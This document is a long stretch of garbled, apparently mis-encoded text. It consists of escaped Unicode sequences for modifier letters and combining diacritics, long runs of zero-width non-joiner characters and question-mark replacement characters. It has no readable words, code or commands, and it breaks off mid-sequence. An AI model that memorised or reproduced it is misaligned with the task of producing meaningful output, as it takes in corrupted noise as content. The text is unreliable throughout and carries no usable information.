0313\u0302\u02e5\u030a\u0312\u02f8\u02f4\u02f0\u02d3\u0301\u02e5\u02f4\u02e7\u02f7\u02f5\u02d3\u0309\u0300\u02e5\u02f3\u02df\u02f4\u02e5\u02d7??\u0301\u030c\u02e8\u0306\u0303\u02ef??\u0306\u0305\u030f\u02ef\u02df\u02f3\u030b\u02f4\u0318\u0300??\u02f4\u0317\u02f7??\u02f4??\u02f7\u02f5\u02d3\u0306\u02f8??\u02f4\u0317\u02df????\u02d3\u0301??\u02f0\u030a\u0300\u02f1\u02d3\u02f1\u02f8\u02f6??\u0314\u0302\u02f6\u02e8\u0308\u02f8\u02f6\u02eb\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u0309\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u030a\u02e8\u030a\u02f8\u030b\u0316\u030a\u02f7??\u02f0\u030e\u0300??\u02d2\u02df\u02f0??\u02f4??\u02f2??\u02e8\u030f\u02f8\u02f5????\u02df??\u02d5??\u0312\u02df??\u0317\u02f8\u02f6??\u0304\u0300\u030b??\u0312\u02f8\u02ef??\u0315\u0301\u030b\u02d7\u030f\u02f6??\u02d3\u0306\u0300\u02f5\u02f3\u02df\u02f1\u02f3????\u0301??\u02f0\u0314\u0300\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02f4??\u0317\u0300??\u02f8\u030e\u02f8\u02e5\u02f4\u0317\u02df??\u030a\u0313\u0302??\u02eb\u0317\u02df??\u030a\u0313\u0302\u02e5\u02f4\u0317\u02f7\u02f5????\u02ff\u02f5\u02d7\u0313\u02df????\u0306\u0300\u02e5\u0316??\u0303\u02f3\u02d3\u0306\u0300\u02f5\u02f3\u02df\u02ef????\u0311\u0300??\u02f0\u02d3\u0301\u02e5\u02f3\u02df\u02f0\u02f5\u02d3??\u02ff\u02f6\u02e8\u0314\u0300\u030b??\u030a\u0300\u030c\u02ef\u02df\u02f0\u02f6\u0306\u030e\u0302\u02df????\u0302\u02f5\u02d3\u030e\u02f8\u030c\u02f4\u0304\u02f4\u02e5\u02f4\u02d2\u0302??\u02e8\u0314\u0303\u02df??\u0317\u02f8\u02f6??\u0314\u0302\u02f6\u02e8\u0308\u02f8\u02f4\u02d7\u0313\u02f7\u02f5??\u030a\u02df\u02ed\u030b??\u0313\u0303\u02ed??\u0310??\u02d7\u0315\u02f7\u02f6\u02e8\u0306\u0300\u02ef??\u0315\u0301\u030b\u02d7\u030f\u02f8\u02f5????\u02f6??\u02d3\u0306\u0300\u02f5\u02f3\u02df\u02d2\u02f7\u02e9\u0318\u02d2\u02f7\u02e9\u0312\u02df??\u02f8\u0306\u0300\u02e6\u02f4\u030a\u02f4\u02e6\u030a\u0315\u02f8\u02ef??\u0306\u0305\u0310??\u0306\u0305\u0310\u02eb\u02df\u02d2\u02f7\u02e9\u030d\u02df\u02ed\u02e5??\u0311??\u02e5??\u030d\u02df??\u0306\u0305\u0310\u200c??\u02f8??\u02f4??\u02f6??\u0302\u030e\u02f8\u02e6\u02f0\u030d\u02df\u02e5\u0302\u030a\u0302??\u02d7\u02e7\u02f8\u02f5\u030a\u030c\u02ff\u02e6\u02ef\u02df\u02f4\u02e5\u0306\u0317\u02f8\u02f5??\u0309\u02df????\u02d3\u0301??\u02f0\u030a\u0300\u02f1\u02d3\u02f3\u02ff\u02e6\u02e8\u030a\u02f7\u02f5\u02f0\u030e\u0300\u030b\u0301\u02df\u02f3??\u0316\u030a\u02f8\u02f6\u200c??\u02d2\u02f7\u02e9\u0308\u02df\u02ed\u02e5??\u0314\u02df??\u0306\u0305\u0310\u02eb\u02df\u02d2\u02f7\u02e9\u030a\u02df??\u030a??\u0300????\u0315\u02f7\u02f6\u02e8\u0306\u02f7\u030b\u0316\u030a\u02f7????\u02df\u02f1\u02f4??\u030a\u0301\u030b\u030a\u0306\u0300\u02e5\u030a\u02d4\u02f7\u02f5\u02e8\u0311\u02f8\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f1\u02d3\u02f2\u02f8\u02f6\u02e8\u030e\u02f7\u02f5\u0316\u030e\u0303\u030b????\u02ff\u02f5\u02d7\u0313\u02df??????\u0301\u030b\u030a\u0313\u02f8\u0315??\u02f2\u0302\u02e6\u02e8\u030e\u0300\u030b\u0302??\u0302\u02f5\u030a\u0311\u02f8\u02e5\u02f4\u0317\u02df????\u0315\u0301\u02e5\u02f4\u0313\u02f8\u02df??\u02f3\u0300??????\u0301\u030b\u030a\u0313\u02f8\u0315??\u030c\u02f8\u02f6\u02f0\u0304\u02f2\u02e5\u02f4\u0313\u02f8??\u02f0\u030d\u02df??\u02f8\u0317\u0300??????\u0301\u030b\u0302\u0307\u02df\u02e5\u0302\u030a\u0302??\u02d7\u02f1\u02df\u02e5\u0302\u030a\u0302??\u02d7\u02e6\u02df\u02e5\u0302\u030a\u0302??\u02d7??\u02df??\u030a\u0313\u0301??\u02f4\u0317\u0302??\u02e8\u0306\u0300\u030b\u0302\u030a\u02df\u02ed\u02e5??\u0311??\u02e5??\u030e\u02df??\u02e6\u02f8\u02f6\u02f0??\u0300\u030c\u02f0\u0317\u0303\u02f3??\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02df??\u02d7??\u0301????\u030a\u0300\u02f5\u02e8\u0311\u0303\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f1\u02d3\u02e8\u0300\u030c\u02f0\u030a\u0301\u030b\u02d7\u0315\u02f3??\u02f4\u0317\u0302\u030b\u030a\u0308\u02f8\u02f6\u02eb\u02df\u02f2\u02e5\u02d7\u0306\u02f8\u02df??\u0306\u0305\u0310??\u0306\u0305\u030f\u02eb\u02df\u02d2\u02f7\u02e9??\u02df\u02ed\u02e5??\u0310\u0303\u02e5??\u030e\u02ef????\u02ff\u02f6\u02f0??\u0300??\u02d3??\u02f8\u02f6\u02e8??\u02f8\u02f6\u02e7\u02df\u02f4\u02e5\u02d7\u02e8\u0300\u030c\u02ef\u0318\u02eb\u0305??\u02e6\u02f8\u02f6\u02f0??\u0303\u02f6\u02f0\u030a\u0301\u0315??\u0306\u0305\u030f??\u0306\u0305\u030f??\u02df\u02f8??\u02f4??\u02f6????\u02f2\u02ef??\u030a\u02e8\u02df\u02e5\u02d7\u0315\u02f6??\u030a\u0313\u02f8\u02f6????\u02f7\u02f5\u0316\u030e\u0302\u02e6\u0309\u02df\u02f3\u030b\u02f4\u0306\u02f8\u02df??\u02e6\u02f8\u02f6\u02f0\u02ef\u02ff\u02f6\u0306\u030a\u0300\u02df??\u030c\u02f8\u02f6\u02f0\u0304\u02ef??\u02d7??\u0300\u030c\u02ef\u02df\u02ef??\u02d7\u0313\u02f7??????\u02df????\u0306\u02eb\u200c??\u0306\u02e7\u02f2??\u02df\u02ef??\u02d7\u0312\u0301\u02e5\u030a\u0311\u02f7\u02f6\u02f0\u030e\u0300??\u02d3\u02f1\u02f8\u02f5\u0316\u0306\u0303\u02e5????\u02ff\u02f5\u02d7\u0313\u0301??????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef??\u02f1\u0302\u02f5\u02d3??\u02ff\u02f5??\u030a\u02ef??\u02d7\u0312\u0301\u02e5????\u02ff\u02f5\u02e8\u030e\u0300\u02e5\u030a??\u0303\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef????\u0301????\u030a\u0300\u02f5\u02e8\u0311\u0303\u02f4\u02f0\u030e\u0302\u02e5\u0316\u030a\u02ef\u02f6\u02f0??\u0301\u030b\u030a\u0307\u0302\u02f6\u02f0\u030a\u02df????\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02f0\u02e5\u02f4\u0318\u02f7??\u02e8\u030e\u0301\u02e6\u02f0\u030e\u0300??\u02d3??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u030a??\u0300??\u02d3\u030b\u02ff\u02f5\u0302??\u0301\u030b????\u02ff\u02f5\u02d7\u0313\u02ef\u02f6\u02f0??\u0301\u030b\u030a\u0307\u0302\u02f6\u02f0\u030a\u02df????\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02ef??\u02d7\u0312\u0301\u02e5??\u0313\u0303\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef????\u0301????\u030a\u0300\u02f5\u02e8\u0311\u0303\u02f4??\u0317\u0300??\u02f0??\u02f7??\u02f0??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u030a??\u0300????\u02d3\u0301\u030b\u030a\u030c\u02ff\u02e6\u02f0??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u030a\u02f3\u0301\u030b??\u0309\u02f8\u02f5??\u0306\u0301\u030b\u0312??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef??\u02d7\u0312\u02f4\u030b\u030a\u0318\u02ff\u02f5\u02e8\u0311\u02f8\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef??\u02e6\u0302\u02f5\u030a\u0309\u02ef\u02f6\u02f0??\u0301\u030b\u030a\u0307\u0302\u02f6\u02f0\u030a\u02df????\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02f0\u030b\u030a\u0311\u02f8\u02f4\u02f8\u030a\u0301\u030c??\u030e\u0300??\u02d3??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02f3??\u02f4\u0315\u0301\u02e6\u02e8\u030a\u0301????\u02e8\u0300\u02e5\u02f0\u0306\u0301??????\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df??\u030d\u02df\u0303\u0307\u0316\u030f\u0318\u0300??\u0303\u0318\u0311??\u02d2\u0313\u02e7??\u0316\u030f\u0303\u200c??\u02e7\u0312??\u030e\u0301\u02f4\u0306\u0309??\u02d2\u02e7\u0309\u02e7\u0311??\u02d7\u0304\u0304\u0316\u02e6\u02f4??\u0308\u030d\u02e6\u200c??\u02e7????\u0305??\u02f0??\u02ef\u02eb\u200c??\u02df??????\u0306??\u02eb\u02df\u0315\u02f7\u0302\u02df\u0316\u030d\u02e6????\u02e7\u02f8??\u0305??\u02e7\u02e6??\u0315\u0301??\u02df\u0305\u02e7??\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0315\u0305\u02e7\u02e6\u02ef\u02eb\u02e7??\u02df\u02f3\u0305\u02df\u02ef??\u0302??\u02ef\u02e7\u0302??\u02ef\u02ef\u02e9\u02df\u02f0\u02e7\u02f8??\u0317\u02df??\u02df\u02f0\u02e7\u02f8??\u02f1\u0309??\u02e7\u200c??????\u0305\u02df??\u02e6\u02ef\u02f3\u0302??\u02f0??\u02e6????\u0315\u02e7\u02e6\u02ef\u02f3\u02e7??\u02df\u02e7??\u02e6\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02f3\u02e9\u02df\u0305\u02d2\u02f1\u02eb\u02ef\u02eb\u02e9\u02df\u02ef\u02d2\u02e8??\u02df????\u02df\u02f0\u02df\u0302\u02e6\u0305\u02df\u02e7\u02df\u0315\u030d????\u02ef\u0301\u200c??\u0306????\u02e6\u02ef\u02f3\u02ed??\u02ef\u0301\u02ed??\u0308\u02f3\u02e7??\u02df\u0305\u02e7??\u02f2\u0309??\u02df\u0305\u02e7\u02f1??\u02ef\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02ef\u02e9\u02df\u02f0\u02e8????\u02df\u030d????\u0309\u02f3????\u0305??\u02f1??\u02ef\u02f7\u02e9\u02df\u0306\u02e7\u02d7??\u0309\u0309\u02e5\u200c????\u02f1\u02f2\u02f0??\u02f0??\u0307\u02df????\u0305??\u02f1\u02f2\u02ef\u02f7\u200c??\u02f0??????\u0309\u02f3\u02e8??\u0315\u02f3\u0301??\u0309??\u02e7??????????\u02df\u030d????\u0305\u02d2\u02e5\u02e7\u02df\u02e7????\u0306\u02e8\u02f8????\u02df??\u02e6\u02df\u02d2\u02e5\u200c??\u02e7\u02f1\u02f0\u02ef\u02d2\u02ed??\u0315\u0301\u02ea??\u0309??\u0301??\u0305??\u02f1??\u02f0\u02e8\u0302\u02e6??\u0315\u02e7????????\u02e6\u02ef\u02eb????\u0305\u02e7\u02ed\u02e6\u02df\u0309\u02df????\u0315\u0301??\u0306??\u030e\u02e6\u02f0\u0315??\u200c????????\u02df\u02f7\u200c??\u0315??\u02ed??\u0305\u02d2????\u0306??\u02f3??\u0315\u0301\u02e6??\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0316????\u02df\u0306\u02d2\u200c??\u0317\u200c????\u02df\u0305\u02ef\u02df\u02ef\u02eb\u02e7\u02e6\u0305\u02df??\u02df\u0315\u0311\u02e6??\u02df\u0305\u02e7??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u02e7??\u02df\u02f7\u200c??\u0315??\u02e7??\u02df\u02eb????\u0306\u02e7??\u02df\u0315\u02f7\u02f0\u02e7??\u030d\u02e6??\u02ef\u0305\u02e7\u02e6??\u02f3\u02f1\u0303\u02ef??\u02ed??\u030c??????\u02df\u0305\u02e7????\u0315\u0301??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02e7\u0302\u02df\u0315\u02e7\u0302??\u0305\u02f7\u0305\u02df\u02f0\u02e9\u02df\u0306\u02ef\u02eb??\u02e7\u200c??\u02ed??\u200c??????\u0306\u02e8????\u02df\u02f3\u02e7??\u0305\u0301\u02e6??\u02df\u0305\u02e7??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u02e7??\u02df????????\u02d2\u02df??\u02df\u0305\u02ed??\u0315\u0305\u02e7??\u02f2\u0309\u02f0\u02ed\u02ef\u0305\u02e7????????\u02e6\u02ef\u02eb\u02e7\u200c??\u02ef\u02f0\u02ed\u02ef\u0305\u02e7??\u02df\u0305\u02e9\u200c??\u02f7\u02f0\u02ed\u02ef\u0305\u02e7??\u02df\u0305\u02e5\u02df\u0315\u0311\u02e6??\u0315\u0305????\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02eb\u0305\u200c??\u02f3\u02e7\u200c??\u02eb????????\u02d3\u02df\u0315\u02eb\u02eb??\u0315\u0305\u02e7??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u0305\u02e7\u02df\u0306\u02d2????\u0307\u02df??\u02df\u02ef\u0305\u02f1\u02f1\u02ef\u0311\u02ef\u02df\u0305\u02f3??\u02e6\u0305\u02df\u02e7\u02e6\u0305??\u02e7??\u02df\u0305\u02e6??\u02ef\u0305\u0301??\u02df\u0305\u0302\u02df\u0315\u02ef\u200c????\u02e8\u02f8??\u0305\u02df????\u030a\u0309????\u02df??\u02e6??\u0315\u0305\u02f1\u0305\u02e7\u0309\u02e7??\u02df\u0305\u0302\u02df\u0316??????\u0305\u02df????\u030a\u0309\u0302??\u02ef\u0305\u200c??\u0316\u02e8\u02f8\u02e6\u02ef\u02f3??\u02df\u0315\u0309\u02e6??\u02f0\u0315\u02e7????????\u02e6\u02ef\u02eb\u02eb??\u0315\u0305\u02e7??\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0316??????\u0305\u02df????????????\u02df\u0305\u02df??\u02df\u0305\u0302??\u02ef\u0305\u02e5\u02df\u0315\u030d\u02e6??\u0315\u0305\u0301??\u02df\u0305\u02e7??????????\u02f1\u02df??\u02e6\u02ef\u02f3\u02ed??\u0316\u02df??????????\u02e6\u0305??\u0303\u200c??\u02eb\u02e5??\u0305\u0301\u02e5????\u0315\u02e7????????\u02e6\u02ef\u02eb??\u200c??\u02df\u02f1\u02eb\u02ef\u02f7\u200c??\u0306\u02e7\u0316\u02df\u0315\u0305\u02e9??\u0315\u0301\u02e7\u02df\u0305\u0305\u02e7??\u02df\u0305\u0302\u02df\u0315\u0301\u200c??\u0305\u02e7\u02f0\u02ed\u02f0??\u02d3??\u02ef\u02df??\u02df\u0306??\u02d3??\u02f2\u0309\u02e5??\u0305\u02d2\u02ef\u02df\u0305\u02f7\u0301\u02e6\u0305??\u0303\u02df????\u030e\u02e6\u02f0\u0315\u02e7\u02df\u0315\u0301\u0305\u02df\u0315\u0305\u0302??\u02ef\u0305\u02e7????\u02df????\u0305\u0305\u0303\u02df????????\u02df\u0305\u02e7??\u0305\u02f7\u0305\u02df\u0306??\u02d3??\u02df\u0305\u02ea??\u02df??????\u02f2\u0309\u0303\u200c??\u0305\u02e7\u02df\u0315\u0305\u02e7??\u02df????????\u02d2\u02df??\u0305\u02f7\u02eb??\u0315\u0305\u02e7\u02e6\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0316??????\u02ef\u02df????\u0305\u02d2\u02ed??\u0306\u02df????\u02df\u02d2\u0303\u02df\u02f0\u02d2\u200c??\u0315\u02eb??\u02e7\u02df??????\u02df\u0305??\u200c??\u0305\u200c??\u200c??\u200c????\u02d2??\u200c????\u02df\u02f4\u02df\u02e7\u02f5\u02f4??\u02e8\u0306\u0301??\u02d3\u0314\u0300\u0309\u02f4\u02d2\u02f7??\u02f4\u0315\u0302\u02e5\u030a\u0314\u0300\u030a\u02f0\u030d\u0301\u030b\u02d7??\u0301\u0315????\u02e7\u02df??????\u0306\u02d2??\u02df??\u030a??\u0302\u02f5\u02d3\u030e\u02f8\u030c\u02f3\u0305\u02f0\u030c\u02e8\u0306\u0300\u02f5\u02f4??\u0300??\u02e8\u0310\u02e7????\u0305\u02f4\u02f3\u0309\u0305\u02f2\u02e5\u030a\u0307\u200c??\u02df\u0305\u02df\u02ef\u02df\u0300\u02ef??\u02f4\u0318\u0302\u02e5\u02d7\u0312\u02e7??\u02e8??\u0300\u030b\u030a\u030b\u0302\u02f1\u02df\u0313\u02f2\u0309\u02f4\u02f3\u02e7\u02e5??\u0314\u0300\u030c\u02f0\u0317\u0300??\u0316\u0318\u200c??\u02df??\u02df\u02ef\u200c??\u200c??\u02df\u02f7\u02df\u02ef\u02df\u02f2\u02ef\u030c\u02f4\u0313\u02ff\u02f5\u02f8??\u02e7??\u02f0\u030a\u02f7??\u0306\u0313\u0300??\u0316\u0314\u02f8??\u030a\u030a\u0301\u0315\u200c????\u0305??\u02df??\u02f3\u02e8??\u0300\u030b\u030a\u030b\u0302\u02f1??\u02f4\u02f1\u02ef\u200c????\u0315??\u02df??\u0309??\u0314\u0301\u02e6\u030a\u0317\u02ff\u02f5\u0302\u030d\u0302??????\u030f\u02f1\u02df\u0305\u02eb\u0308\u02df\u0316??\u0305\u200c??????\u02df??\u02df\u02ef\u02e7\u030e\u02df\u02ef\u02df\u0309\u02ed\u02f5\u02f8\u0307\u02ed??\u02e7\u0315??\u030b\u02f3\u0312????\u02df\u0315\u02f8\u0307????\u02eb\u0318\u02f7\u0315\u02ea\u02f2\u0309????\u0318\u0309\u0312\u02eb??\u0309??\u02eb\u02f2??\u0306????\u02e8\u030b\u02f7\u02f2\u02f7??\u200c??\u02df\u02eb\u02df\u02ef\u02df\u02e6\u02eb\u02f1\u02d2\u0318\u02ea\u0308\u02df\u0313\u02eb\u200c??\u02df??\u02df??\u200c??\u02df??\u0309\u02f4\u0315\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??????\u02f4\u0315\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02d6??\u0301\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u0304\u02ef??\u02d7\u0317\u02f0\u02e5\u0316\u0311\u02f2\u02f5??\u030e\u0300\u0305??\u0312\u0301????\u0314\u0301\u030b\u02f4\u030a\u02ea\u030b\u02f0\u0311\u0300\u200c??\u200c??\u200c??\u02df??\u0317\u02f3\u02df\u02e7??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u200c??\u200c??\u02df\u02f7\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c????\u200c??\u200c??\u0315\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c????\u02e7\u200c??\u200c??\u02f5\u02e5\u200c??\u02df\u02e8\u02ef??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e8\u02ef????\u200c??\u200c????\u02f7\u02df\u02f3\u0315??\u0304\u02df??\u02f7\u02df\u02f0\u02ef??\u02f1\u02df??\u02eb\u02df\u02f1\u02ef????\u02df??\u02d2\u02df\u02f6\u0315??\u02e8\u02df??\u02d2\u02df\u02f0\u0305????\u200c??\u200c??\u200c????\u02d7??\u02ed????\u200c??\u02df??\u200c??\u02eb\u200c??\u02ef\u200c??\u200c??\u200c??\u02df\u0315\u02df??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u02ef\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02f0\u200c??\u200c??\u02df??\u02df\u02f4\u0305??\u0306\u02df\u02e6\u02e7\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u02e8\u02df\u02e5\u02d2\u02df\u02f8\u0305??\u0314\u200c??\u200c??\u200c??\u02df\u0309\u200c??\u02ef\u200c??\u02df??\u02f3\u02df\u02e6\u02e7\u02df\u02f7\u02ef??\u0313\u02df\u02e6\u02eb\u02df\u0300\u02df??\u0306\u02df\u02e6\u02ef\u02df\u02ff\u02ef??\u0314\u02df\u02e5\u02d2\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u02df\u02f2??\u02df\u0305\u200c??\u02df\u02ef??\u02f2\u02df\u02e6\u02ef\u02df\u0301\u0305??\u030e\u02df\u02e5\u02d2\u02df\u02f8\u0315??\u02e5\u02df\u02e5\u0309\u02df\u0300\u02df??\u030a\u02df??\u0309\u02df\u0300\u0305??\u030b\u02df\u02e5\u02d6\u200c??\u02df??\u02ef\u02df\u0305\u200c??\u02df\u02ef\u02df\u0315\u02df??\u200c??\u02eb\u200c??\u0315\u02df??\u200c????\u02df??\u0307\u02df??\u200c??\u200c????\u02ef\u02df??\u0315\u200c??\u02ef????\u02df\u02e5\u02d6\u02df\u0300\u02ef??\u0312\u02df\u02e5\u02f3\u02df\u0300\u0305????\u02df\u02e6\u02eb\u200c??\u02df????\u02df\u02e6\u02f3\u02df\u0301\u0315????\u02df\u02e5\u02d6\u02df\u0300\u02ef\u02df\u0305\u02df??\u02e7\u02df\u0302\u02ef??\u0313\u02df\u02e5\u0309\u02df\u02f8\u0305????\u02df??\u200c??\u02ea\u0305??\u02ed\u02df??\u02f3\u02df\u02f4\u200c??\u0305\u02df\u02e5\u02eb\u02df\u0300\u0315??\u0313\u02df\u02e6\u02ef\u02df\u0301\u0305??\u0314\u02df\u02e5\u0315\u02df\u0301\u0315\u200c??\u02df??\u0305\u02df??\u200c????\u02df??\u02eb\u02df\u0300\u0315??\u0312\u02df\u02e6\u200c??\u02f7\u02ef??\u0313\u02df\u02e6\u0309\u02df\u02f2\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef\u200c??\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02e7\u02df??\u02f3\u02df\u02e5\u02f3\u02df\u02f7\u0315??\u030d\u02df\u02e5\u02d2\u02df\u0300\u0315??\u0311\u02df\u02e5\u02d6\u02df\u02f8\u0315??\u030e\u02df\u02e5\u02f3\u02df\u0301\u0315\u200c??\u02df??\u0315\u02df\u02e5\u0305\u02df??\u02df??\u02f7\u02df\u02ff\u02ef??\u0311\u02df\u02e5\u02f3\u02df\u02f0\u02df??\u030a\u02df\u02e6\u02eb\u02df\u02f7\u0315??\u0317\u02df\u02e5\u0309\u02df\u0301\u02df????\u02df\u02e5\u0309\u02df\u0300\u0315??\u0313\u200c??\u200c??\u200c??????\u02df\u02e6\u02f3\u02df\u0300\u0305??\u030e\u02df\u02e5\u02f7\u02df\u0302\u02ef\u02df\u0305\u02df??\u02f7\u02df\u0301\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef????\u02df\u02e5\u02d6\u02df\u0301\u0305??\u0310\u02df??\u200c??\u02ea\u02ef\u02df\u0305\u02df??\u02f3\u02df\u02f1\u02ef\u02df\u0305\u02df??\u0315\u02df\u02ff\u02ef??\u0307\u200c??\u200c??\u02eb\u200c??\u02e7\u200c????\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u02f5\u02df\u02e5\u02f3\u02df\u0301\u0305??\u0318\u02df\u02e5\u0309\u02df\u0300\u0315??\u0313\u200c??\u200c??\u200c??\u02df\u0316\u02df??\u02d2\u02df\u02eb\u0315\u02df\u0313\u02df??\u200c??\u02ea\u0305\u02df\u0315\u200c??\u200c????\u200c??\u02ed\u200c????\u02df\u02f1\u02ef??\u0313\u02df\u02e6\u02ef\u02df\u02f8\u02ef??\u0317\u02df\u02e5\u02d2\u02df\u02f7\u02ef??\u0311\u02df??\u02d2\u02df\u02f7\u02ef??\u0312\u02df\u02e5\u02f3\u200c??\u02df????\u02df\u02e6\u02f3\u02df\u0300\u0305??\u030e\u02df\u02e5\u02f7\u02df\u0302\u02ef\u02df\u0313\u02df??\u02f3\u02df\u02f1\u02ef\u02df\u0313\u02df\u02e5\u02ef\u02df\u0300\u02df??\u0311\u200c??\u200c??\u02f1\u200c??\u02f1\u200c????\u02df\u02f2\u02df??\u030a\u02df\u02e5\u0301\u02df\u02f7\u02ef??\u0311\